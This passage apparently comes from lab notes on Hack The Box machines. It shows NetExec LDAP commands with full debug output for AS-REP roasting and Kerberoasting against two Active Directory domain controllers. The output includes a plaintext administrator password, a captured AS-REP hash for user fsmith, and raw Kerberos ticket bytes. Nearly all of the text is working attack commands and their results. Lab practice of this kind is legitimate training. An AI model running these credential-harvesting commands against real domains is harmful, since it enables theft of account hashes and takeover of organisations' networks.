           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[07:59:59] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling get_sid()                                                                                                                                                                                      connection.py:263
[07:59:59] INFO     LDAP        10.129.175.223  389    DC               Domain SID S-1-5-21-405608879-3187717380-1996298813                                                                                                      ldap.py:579
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --asreproast
```sh
└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p '' --asreproast asreproast.txt --debug
[06:34:13] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.95.180'], username=['EGOTISTICAL-BANK.LOCAL\\fsmith'], password=[''], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                            
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast='asreproast.txt', kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False,                       
                    users=None, users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False,                                
                    collection='Default')                                                                                                                                                                                                   
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
[06:34:14] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.95.180, hostname=10.129.95.180, kerberos=False, ipv6=False, link-local ipv6=False                                                                                             connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.95.180 with no baseDN                                                                                                                                                            ldap.py:173
           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7ff9bf1fcad0>                                                                                                                                ldap.py:177
[06:34:15] DEBUG    Target: SAUNA.EGOTISTICAL-BANK.LOCAL; target_domain: EGOTISTICAL-BANK.LOCAL; base_dn: DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                           ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[06:34:16] INFO     Error resolving hostname EGOTISTICAL-BANK.LOCAL: [Errno -2] Name or service not known                                                                                                                  connection.py:192
           INFO     Resolved domain: EGOTISTICAL-BANK.LOCAL with dns, kdcHost: None                                                                                                                                              ldap.py:257
           DEBUG    Update Hosts: [{'id': 4, 'ip': '10.129.95.180', 'hostname': 'SAUNA', 'domain': 'EGOTISTICAL-BANK.LOCAL', 'os': 'Windows 10 / Server 2019 Build 17763'}]                                                   database.py:92
           DEBUG    add_host() - Host IDs Updated: [4]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[06:34:16] INFO     LDAP        10.129.95.180   389    SAUNA            Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)                                                                        ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
[06:34:17] INFO     LDAP        10.129.95.180   389    SAUNA                                                                                                                                                                     ldap.py:421
                    $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d8e8ee3025fa78be6ad392cd1815b92c$ce8d5fa4316986438bf99388d64565ac0e56662e2f3b515da165dab2ad8473c1a0d24a99fbe36c793140952e60d6481c18c6b3aba9319a96175a884d14ab75d            
                    d258acc13ee23d1f852e03b49a2d5500c8f15284fe7aaec61f2e4192795f15e6affe6a1b4e8c47b70aba92ac95761875b99bc4ea0455cc031fdcdc7a40ffdae51e54f248a92ab3c4ea2ca9f3b1b1874466680f691bb8ed81e9e65d220f4f9be7ef349d1fc029            
                    9287cf57e04f3e096e48b65d6a0a81ed7a26b0d8d901742d559def00f9e1c607f2ce13da685d393ca6b2a1bd22c0df6c7016a5462a7ca15062568b6ccfe624245e2951e13ae5cccead00fa0ec78bef88be073bae6ac08a658d582                                   
[06:34:17] DEBUG    Closing connection to: 10.129.95.180 
```


### --kerberoasting
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --kdcHost 10.129.175.223 --kerberoasting kerberoast.txt --debug
[02:58:52] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost='10.129.175.223', pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,               
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast=None, kerberoasting='a.txt', base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False, users=None,                    
                    users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')                      
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
[02:58:53] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7fb18bf90d70>                                                                                                                                ldap.py:177
[02:58:54] DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[02:58:54] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[02:58:56] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
[02:58:57] DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[02:58:58] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[02:58:58] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling kerberoasting()                                                                                                                                                                                connection.py:263
           DEBUG    Search Filter=(&(servicePrincipalName=*)(!(objectCategory=computer)))                                                                                                                                        ldap.py:625
           DEBUG    Search Filter: (&(servicePrincipalName=*)(!(objectCategory=computer)))                                                                                                                                       ldap.py:849
           DEBUG    Attributes: ['sAMAccountName', 'userAccountControl', 'servicePrincipalName', 'MemberOf', 'pwdLastSet', 'lastLogon']                                                                                          ldap.py:850
           DEBUG    Response: [{'memberOf': ['CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb', 'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema              ldap.py:851
                    Admins,CN=Users,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], 'userAccountControl': '66048', 'lastLogon': '133979180625717442', 'pwdLastSet': '131764144003517228', 'sAMAccountName':            
                    'Administrator', 'servicePrincipalName': 'active/CIFS:445'}, {'memberOf': 'CN=Denied RODC Password Replication Group,CN=Users,DC=active,DC=htb', 'userAccountControl': '514', 'lastLogon': '0',                         
                    'pwdLastSet': '131764134369720307', 'sAMAccountName': 'krbtgt', 'servicePrincipalName': 'kadmin/changepw'}]                                                                                                             
[02:58:58] INFO     LDAP        10.129.175.223  389    DC               Skipping disabled account: krbtgt                                                                                                                        ldap.py:859
[02:58:58] INFO     LDAP        10.129.175.223  389    DC               Total of records returned 1                                                                                                                              ldap.py:863
[02:59:01] DEBUG    Final TGT: {'KDC_REP':                                                                                                                                                                                   kerberos.py:178
                    b'k\x82\x05^0\x82\x05Z\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x0b\xa3\x0c\x1b\nACTIVE.HTB\xa4\x1a0\x18\xa0\x03\x02\x01\x01\xa1\x110\x0f\x1b\radministrator\xa5\x82\x04\x12a\x82\x04\x0e0\x82\x04\n\xa0\x03\                
                    x02\x01\x05\xa1\x0c\x1b\nACTIVE.HTB\xa2\x1f0\x1d\xa0\x03\x02\x01\x01\xa1\x160\x14\x1b\x06krbtgt\x1b\nACTIVE.HTB\xa3\x82\x03\xd20\x82\x03\xce\xa0\x03\x02\x01\x12\xa1\x03\x02\x01\x02\xa2\x82\x03\xc0\x04                
                    \x82\x03\xbc\x8d\xab\xa4\x07Z\x85\x85\x7f\x04\x90\xadj\xd0\x1a\x07\xce2\x0e\xed\xd1*\xd4>\x10P\xbd\x98^\xcaJc~\xa0\xa5$\xe2\xf8\x070\xbf\x04\x96\x9e\xef\xc8\xcd\xfd@\xe1_\xbb\xf7r\xc3\xc1l\t"z\xf3&\xa                
                    b\xefw\x10\xa72.\xc2\xcc\x18m\xba\xd5\x87\x88+D)L\xbfE}f\x97                                                                                                                                                            
                    \x92\xf9\x13L#\xd3kjg\x05\nD\xe3\x82A\xe4b\x06\xf3K\xc7\xf1\xa3\x91e\x12\\U\xeb\xb2\xdb\xde\xa8*\xb8ydO\xf0\x93LP\x06\xa2\x12\x90\x0039\x8a\xc1\x1e\t4\xba\x03\xca\xbf*1\xc3h\xb6\xed\x91\x81\n;a\x02G\x                
                    e9\x84\xd2Z\x02*                                                                                                                                                                                                        
                    \xdf\xdd\xa5\xa3\xfc\x9f\x7f`\xc4\xe1Y^@\x87\xf7\xfa\xf1k\x1dY\xa0\xc2\x18\xd9"L\x1e\x08\x80\x12\xb6\nnQ\xa1\xaa|\xed\xa1\xedP\xa4<\xed\xf8\x1b\xf2\xf1\xa5\x16\xca\xba\xb4\xbcu\xe6V\xb8                               
                    7\xcf\xdaN\xd3\x8f^\x93\xc7\x84\xabE\xc6\xa2\xa3N\xfe\xdc5\x1c\x9c\xb5\xe1|\xd8}{\xa5j\xc6\xb2\xa4\x03\xa62\xb7g\r\x17\x80\x80\xa24\x07.JI8\xf0\xde2+\xf2\xcf\xbb\xe2B\xc4\xa1\xdc\xceK\xee\xff\xba\x0bS                
                    \xef\x8fU\x96\xfb\xe4[\x1e\xba\x9bX\'\x8eB\xb6\xe0\xc0\x00\xd3\x96\xd8\x9c\xf5\xa7\x9e\x07BGM\xd56H&7\'\x0c\xd9\xfbj\xe19\xd3\xc4\x7f(9Zg\xd9m\xf5\xad:\xe3q4\x81\x85?\xe0\xa5\xc0L\xef\xd45uXz\x0b\x9f%                
                    \xe7\x0b+!.\xf7I\xe3\xcc\xa1\r\x8b\xf66\x8d*@\xbf\x80\x80\xe2\xd9\xbf6?\xa9Y\xc2\xcf\xf7\x11\x8cK46\xc2\xf2\x8a$$X7\x08\xb8\x18B\xee\xeeDJw\'L\xa2{^\ni                                                                 
                    \x9f\xec\x01a\xc1\x9d\x9d\xa0N\xc4\xf4\xf2\x00\x0fz6\\\xd6c\xb2w\r\x92\xa9Q\xb3\x04r\x07\xc1\xce#6\xf1\x15\xa0\x8a\xdf\xad\xf8~7\xc2\x1b\x8cS\x9b\xb0\xef\xab\xef\x98\xe1\xcf\xbd\x14dji\xcf\x0e\x88\xcb                
                    ]\'\xb2$\x91\x05\x0fyL\x16\x1d\xf3\xbcQ4)y\xe6L\xf7\xfa\x96\xd0J\xa1\xf1S\x82\x9c\xa6\x07\x85u\xba\xd2\x0e\xc2\xb5[`G\x1c\xf1|\xc0\xce\xdc\\\x8d\x92g\x1c4K.\x8a}\x87\x03e\x91\xaa$\xf3\xfbx"\x81\xdaj\x                
                    00\x9a\xe1\x83\n\xd5\x9e8\x93\x91\x91\xb7{\x866\xbd\x8a=^\xa9\x999\x01$\x1aD\xc6\x1c\xd1k\x90\xf3\x95.\xdc\xc4}`\xb2>\xa3\xa1\xa3\xb0ei\x18c\x8a\xe72\xc0\x80\x0b>\xa4\xc90\x14\xf8\x83\xe7\rXp\x1d\xafR                
                    \x0f\xecc\xa8\x05wF\x18\xa6\x89i\xfb\xee\xf2/:"\xc8\xa3!e\xc7\xab\x94\xbd\xa2~\x00\xa17p*X\xa0\xad0g\xdc^\x0f\xff\xd9&TM\xfd\xd4R\xc9\x1a\x06\x0e~\xadB\xb0\xa6\x8a\x92\xf4\x12\xae\xf2\x96\xb9\xde\x13y                
                    \x06\xbfX\xb4\xb2\x1dfh\xc4\x7fn\x9d9\xcc\xc8\xdc\xb9\xac\x83\xa16Z\xc0\xaa\x9a\x17S,\xcf\x1e\x8e\xe0\x9fz\x8f3\x9e\xd6\xe0\xd7H\xdc\xa2u\x7fQ\xeb\x0c[\xd2-0}\xb6\xeeZK\xf0\x8f\x0ei\rB\xa9\xab\x1e\x14                
                    }k\xa7\x8f\x92\xf6c\x81\xc0\xb9\x06p\xcd\xd9xE\xb4\x1dD8\xb1\xf1\xa7"\xf0\xfe~\x83L/\xcb\xf9\xa0q\xbf\xf3\xe7:2O\xe2\x86\xe3\xdd\x9eC\xd4C\x9cL\x99p\x88j\xf4\xb2\xfd%\xf4\xec\x86\xc8\x9e\xa1\x0e+\xa9x                
                    \xea\xdf\xd6\xab2D\x8b\x81\xdf\xf78\x82\xe0+\xb7\xab}\x93\x12l\xa5\xf1\xf8\x13\xf6\xd7\xcc\xc3\xc2\xebl\xc1\xa2\xe6\xf0\xe0%\x08G\x87\xb5D!\'^\xb5\xeb\x9e\x83\x84h\xb5\x99\x7f\xfc\xc0\x0fN\xcd\xd3\xc6                
                    \xa1h!\x94.9CI\x8e\xe4\xaa\x80Q`\x04\x07]\x17D\xb9\xc8j\x95\x9f\xd0\xb9\x04\x1e@\xd2\x1erS_8(\xf5\x8b\xc2\x14\xe8\x99|\x02\xae\xfb\x11\xc0\xc0(\x8ax#\xfc\xb1\xb1w&x\xa8\xe4\xa6\xad\x1d\x0cM\xd6\x171\x                
                    89\xa6\x82\x01\x0c0\x82\x01\x08\xa0\x03\x02\x01\x17\xa1\x03\x02\x01\x02\xa2\x81\xfb\x04\x81\xf8}\xba\xfamg\xc4\x07\xf5\x8c\x11I\xc9`\xe4\x81\xfe$\xfe\x18\xa4b\x18l\x99\xf8\xd5P@\xa9\xcdk\xc1W\xf5nI\xe                
                    d\xb2\xd31\xd2\xf9H\xf6\xde\xe6\xb5\xdah\tR\xf3\xbe\xa0\xeb\x93\xd7+\x82\xa4\xd3\xd4:\xc9\xe2u\x86Gus\x16\x91\xf9\xb7]\xaa\x00\xe9\x07l\xa7%k\x84u~fG~\xac\xf0\xf0\xf7\x07\\\xaa\xfe\xb1L&\xce\xd8\xd9j\                
                    xf5\x8a\xc5\x10q\xbb\x01r\xa7O\x08N\x7f\xb0\x8f\xd3!\xa7(u\x16\xf5[\x80\x95F\xa9\xe2f\xef\xbct\xc3\xf1\xc0C\xa8)\x83\x94\x9e}\x17\x9f\xcd\x9fN\xdb)\xdb(lGmS\xe9q]r\xf9\xbe\xe1\xbb\xe0\xa1\x87.\xeb\xfc                
                    \x04"!\xed\xb0\x01\x9b\xd7\x1a_\x89{e~\xb6\xd4\x1d\xfah_\xb8\xc0\xe8\x03\xef\x1f\xb0U\xa8"\xee\xf1N\x13i\xad\r\xeb\xbe\xb3\x1d\x8b\xe8L                                                                                 
                    \xf6\x1a\xffr\r/>\xd0;\xc1\xee\xa7q\xb1\x1b*\x07V\t<\xa8z\x19>8\xfe\x15\xb5\xb8\xb2', 'cipher': <class 'impacket.krb5.crypto._RC4'>, 'sessionKey': <impacket.krb5.crypto.Key object at 0x7fb18bf6c7d0>}                 
           DEBUG    TGT: {'KDC_REP':                                                                                                                                                                                             ldap.py:868
                    b'k\x82\x05^0\x82\x05Z\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x0b\xa3\x0c\x1b\nACTIVE.HTB\xa4\x1a0\x18\xa0\x03\x02\x01\x01\xa1\x110\x0f\x1b\radministrator\xa5\x82\x04\x12a\x82\x04\x0e0\x82\x04\n\xa0\x03\x02\            
                    x01\x05\xa1\x0c\x1b\nACTIVE.HTB\xa2\x1f0\x1d\xa0\x03\x02\x01\x01\xa1\x160\x14\x1b\x06krbtgt\x1b\nACTIVE.HTB\xa3\x82\x03\xd20\x82\x03\xce\xa0\x03\x02\x01\x12\xa1\x03\x02\x01\x02\xa2\x82\x03\xc0\x04\x82\x03            
                    \xbc\x8d\xab\xa4\x07Z\x85\x85\x7f\x04\x90\xadj\xd0\x1a\x07\xce2\x0e\xed\xd1*\xd4>\x10P\xbd\x98^\xcaJc~\xa0\xa5$\xe2\xf8\x070\xbf\x04\x96\x9e\xef\xc8\xcd\xfd@\xe1_\xbb\xf7r\xc3\xc1l\t"z\xf3&\xab\xefw\x10\x            
                    a72.\xc2\xcc\x18m\xba\xd5\x87\x88+D)L\xbfE}f\x97                                                                                                                                                                        
                    \x92\xf9\x13L#\xd3kjg\x05\nD\xe3\x82A\xe4b\x06\xf3K\xc7\xf1\xa3\x91e\x12\\U\xeb\xb2\xdb\xde\xa8*\xb8ydO\xf0\x93LP\x06\xa2\x12\x90\x0039\x8a\xc1\x1e\t4\xba\x03\xca\xbf*1\xc3h\xb6\xed\x91\x81\n;a\x02G\xe9\x            
                    84\xd2Z\x02* \xdf\xdd\xa5\xa3\xfc\x9f\x7f`\xc4\xe1Y^@\x87\xf7\xfa\xf1k\x1dY\xa0\xc2\x18\xd9"L\x1e\x08\x80\x12\xb6\nnQ\xa1\xaa|\xed\xa1\xedP\xa4<\xed\xf8\x1b\xf2\xf1\xa5\x16\xca\xba\xb4\xbcu\xe6V\xb8                  
                    7\xcf\xdaN\xd3\x8f^\x93\xc7\x84\xabE\xc6\xa2\xa3N\xfe\xdc5\x1c\x9c\xb5\xe1|\xd8}{\xa5j\xc6\xb2\xa4\x03\xa62\xb7g\r\x17\x80\x80\xa24\x07.JI8\xf0\xde2+\xf2\xcf\xbb\xe2B\xc4\xa1\xdc\xceK\xee\xff\xba\x0bS\xef            
                    \x8fU\x96\xfb\xe4[\x1e\xba\x9bX\'\x8eB\xb6\xe0\xc0\x00\xd3\x96\xd8\x9c\xf5\xa7\x9e\x07BGM\xd56H&7\'\x0c\xd9\xfbj\xe19\xd3\xc4\x7f(9Zg\xd9m\xf5\xad:\xe3q4\x81\x85?\xe0\xa5\xc0L\xef\xd45uXz\x0b\x9f%\xe7\x0b            
                    +!.\xf7I\xe3\xcc\xa1\r\x8b\xf66\x8d*@\xbf\x80\x80\xe2\xd9\xbf6?\xa9Y\xc2\xcf\xf7\x11\x8cK46\xc2\xf2\x8a$$X7\x08\xb8\x18B\xee\xeeDJw\'L\xa2{^\ni                                                                         
                    \x9f\xec\x01a\xc1\x9d\x9d\xa0N\xc4\xf4\xf2\x00\x0fz6\\\xd6c\xb2w\r\x92\xa9Q\xb3\x04r\x07\xc1\xce#6\xf1\x15\xa0\x8a\xdf\xad\xf8~7\xc2\x1b\x8cS\x9b\xb0\xef\xab\xef\x98\xe1\xcf\xbd\x14dji\xcf\x0e\x88\xcb]\'\            
                    xb2$\x91\x05\x0fyL\x16\x1d\xf3\xbcQ4)y\xe6L\xf7\xfa\x96\xd0J\xa1\xf1S\x82\x9c\xa6\x07\x85u\xba\xd2\x0e\xc2\xb5[`G\x1c\xf1|\xc0\xce\xdc\\\x8d\x92g\x1c4K.\x8a}\x87\x03e\x91\xaa$\xf3\xfbx"\x81\xdaj\x00\x9a\x            
                    e1\x83\n\xd5\x9e8\x93\x91\x91\xb7{\x866\xbd\x8a=^\xa9\x999\x01$\x1aD\xc6\x1c\xd1k\x90\xf3\x95.\xdc\xc4}`\xb2>\xa3\xa1\xa3\xb0ei\x18c\x8a\xe72\xc0\x80\x0b>\xa4\xc90\x14\xf8\x83\xe7\rXp\x1d\xafR\x0f\xecc\xa            
                    8\x05wF\x18\xa6\x89i\xfb\xee\xf2/:"\xc8\xa3!e\xc7\xab\x94\xbd\xa2~\x00\xa17p*X\xa0\xad0g\xdc^\x0f\xff\xd9&TM\xfd\xd4R\xc9\x1a\x06\x0e~\xadB\xb0\xa6\x8a\x92\xf4\x12\xae\xf2\x96\xb9\xde\x13y\x06\xbfX\xb4\xb            
                    2\x1dfh\xc4\x7fn\x9d9\xcc\xc8\xdc\xb9\xac\x83\xa16Z\xc0\xaa\x9a\x17S,\xcf\x1e\x8e\xe0\x9fz\x8f3\x9e\xd6\xe0\xd7H\xdc\xa2u\x7fQ\xeb\x0c[\xd2-0}\xb6\xeeZK\xf0\x8f\x0ei\rB\xa9\xab\x1e\x14}k\xa7\x8f\x92\xf6c\            
                    x81\xc0\xb9\x06p\xcd\xd9xE\xb4\x1dD8\xb1\xf1\xa7"\xf0\xfe~\x83L/\xcb\xf9\xa0q\xbf\xf3\xe7:2O\xe2\x86\xe3\xdd\x9eC\xd4C\x9cL\x99p\x88j\xf4\xb2\xfd%\xf4\xec\x86\xc8\x9e\xa1\x0e+\xa9x\xea\xdf\xd6\xab2D\x8b\x            
                    81\xdf\xf78\x82\xe0+\xb7\xab}\x93\x12l\xa5\xf1\xf8\x13\xf6\xd7\xcc\xc3\xc2\xebl\xc1\xa2\xe6\xf0\xe0%\x08G\x87\xb5D!\'^\xb5\xeb\x9e\x83\x84h\xb5\x99\x7f\xfc\xc0\x0fN\xcd\xd3\xc6\xa1h!\x94.9CI\x8e\xe4\xaa\x            
                    80Q`\x04\x07]\x17D\xb9\xc8j\x95\x9f\xd0\xb9\x04\x1e@\xd2\x1erS_8(\xf5\x8b\xc2\x14\xe8\x99|\x02\xae\xfb\x11\xc0\xc0(\x8ax#\xfc\xb1\xb1w&x\xa8\xe4\xa6\xad\x1d\x0cM\xd6\x171\x89\xa6\x82\x01\x0c0\x82\x01\x08\            
                    xa0\x03\x02\x01\x17\xa1\x03\x02\x01\x02\xa2\x81\xfb\x04\x81\xf8}\xba\xfamg\xc4\x07\xf5\x8c\x11I\xc9`\xe4\x81\xfe$\xfe\x18\xa4b\x18l\x99\xf8\xd5P@\xa9\xcdk\xc1W\xf5nI\xed\xb2\xd31\xd2\xf9H\xf6\xde\xe6\xb5\            
                    xdah\tR\xf3\xbe\xa0\xeb\x93\xd7+\x82\xa4\xd3\xd4:\xc9\xe2u\x86Gus\x16\x91\xf9\xb7]\xaa\x00\xe9\x07l\xa7%k\x84u~fG~\xac\xf0\xf0\xf7\x07\\\xaa\xfe\xb1L&\xce\xd8\xd9j\xf5\x8a\xc5\x10q\xbb\x01r\xa7O\x08N\x7f\            
                    xb0\x8f\xd3!\xa7(u\x16\xf5[\x80\x95F\xa9\xe2f\xef\xbct\xc3\xf1\xc0C\xa8)\x83\x94\x9e}\x17\x9f\xcd\x9fN\xdb)\xdb(lGmS\xe9q]r\xf9\xbe\xe1\xbb\xe0\xa1\x87.\xeb\xfc\x04"!\xed\xb0\x01\x9b\xd7\x1a_\x89{e~\xb6\x            
                    d4\x1d\xfah_\xb8\xc0\xe8\x03\xef\x1f\xb0U\xa8"\xee\xf1N\x13i\xad\r\xeb\xbe\xb3\x1d\x8b\xe8L \xf6\x1a\xffr\r/>\xd0;\xc1\xee\xa7q\xb1\x1b*\x07V\t<\xa8z\x19>8\xfe\x15\xb5\xb8\xb2', 'cipher': <class                      
                    'impacket.krb5.crypto._RC4'>, 'sessionKey': <impacket.krb5.crypto.Key object at 0x7fb18bf6c7d0>}                                                                                                                        
[02:59:02] INFO     LDAP        10.129.175.223  389    DC               sAMAccountName: Administrator, memberOf: ['CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb',      ldap.py:894
                    'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema Admins,CN=Users,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], pwdLastSet: 2018-07-18 15:06:40.351723, lastLogon:                    
                    2025-07-25 07:54:22.571744                                                                                                                                                                                              
[02:59:02] INFO     LDAP        10.129.175.223  389    DC                                                                                                                                                                        ldap.py:895
